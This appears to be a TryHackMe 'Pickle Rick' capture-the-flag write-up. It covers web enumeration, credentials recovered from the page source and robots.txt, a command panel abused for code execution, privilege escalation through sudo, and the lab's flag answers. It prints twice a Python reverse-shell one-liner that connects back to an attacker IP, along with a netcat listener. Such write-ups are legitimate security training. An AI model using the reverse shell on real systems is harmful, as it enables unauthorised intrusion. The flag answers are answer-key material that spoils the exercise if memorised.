l# Pickle Rick

December 22, 2023 

----------------------------

```
Username: R1ckRul3s

view-source:http://10.10.98.98/ 
```

```
Wubbalubbadubdub

http://10.10.98.98/robots.txt
```

```
nmap -sC -sV -oN nmap-initial 10.10.98.98
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-22 23:33 PST
Nmap scan report for 10.10.98.98
Host is up (0.29s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c92a0c28fddb026c9e1c0fe4ca784513 (RSA)
|   256 cbdd3d436888dc42ecf4754f1e11dc7e (ECDSA)
|_  256 5b991475177e89d94a3fa2025021f980 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 62.09 seconds
```

```
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.135.209",7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```	

------------------------------

- What is the first ingredient that Rick needs?
	- `mr. meeseek hair`

- What is the second ingredient in Rick’s potion?
	- `1 jerry tear`

- What is the last and final ingredient?
	- `fleeb juice`


<details>
Steps:
If you visit the source page of the website / 

![image](https://github.com/kyou00/tryhackme-writeups/assets/92074685/091d7e9e-cd17-4085-a900-afbb4a35ba87)

you will see a username that we can use later on

as we use the gobuster we can see there is a asset page in the website

![image](https://github.com/kyou00/tryhackme-writeups/assets/92074685/f8051952-8613-4c36-9349-b664d1242052)

then we can see bunch of files in the assets page but there is a png that stands the most which is the portal

![image](https://github.com/kyou00/tryhackme-writeups/assets/92074685/2ee3f180-59da-4112-ad59-7cf433474138)

as i think for a second that this image was being used somewhere in the website just different directory

well after few navigations to the website i used the portal keyword and add a .php extension to it

![image](https://github.com/kyou00/tryhackme-writeups/assets/92074685/0a220447-e3fb-4b0d-87f9-53221ec6399c)

we know the username but we do not know the password 

so after i navigate to /robots.txt in the website i can see some words in there

![image](https://github.com/kyou00/tryhackme-writeups/assets/92074685/5e26c7c3-2b3f-4e5b-957f-316947ef3215)

So i tried using the username R1ckRul3s and Wubbalubbadubdub as password in the /portal.php

and it is a success

![image](https://github.com/kyou00/tryhackme-writeups/assets/92074685/03be194c-447c-48b3-b222-ba5e2eec6fe2)

first we can check for a few commands that we can use in the command panel

![image](https://github.com/kyou00/tryhackme-writeups/assets/92074685/a51b70eb-5eb9-49e6-9b49-e9c14b91af32)

then we can check for python 3 

![image](https://github.com/kyou00/tryhackme-writeups/assets/92074685/fb9030f0-29d0-4ab8-93ec-9367243ecf7e)

as we have python 3 in the command line we can use this to have a reverse shell to the server

```
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.135.209",7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

then we need to listen in our attacker machine

```
nc -lnvp 7777
```

![image](https://github.com/kyou00/tryhackme-writeups/assets/92074685/cb6672db-ce8a-4624-8020-6a0c89dcceac)

we can use sudo -l to see some privilege

```
sudo -l
```

then sudo su if we can 

![image](https://github.com/kyou00/tryhackme-writeups/assets/92074685/651e1a7b-a99b-45a1-9c6f-941284eccb9e)

now we own the box 
</details>
